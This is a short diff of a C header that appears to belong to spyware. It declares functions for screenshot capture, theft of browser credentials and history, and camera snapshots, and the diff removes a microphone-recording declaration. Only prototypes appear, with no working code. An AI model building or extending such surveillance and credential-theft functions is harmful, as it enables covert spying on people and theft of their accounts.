@@ -22,9 +22,6 @@ char *spy_screenshot_capture(int *len_out);
 char *spy_browser_creds_steal(int *len_out);
 char *spy_browser_history_steal(int *len_out);
 
-/* Microphone recording — returns WAV file data; duration in seconds */
-char *spy_mic_record(int duration_sec, int *len_out);
-
 /* Camera snapshot — returns BMP file data */
 char *spy_camera_snapshot(int *len_out);
 
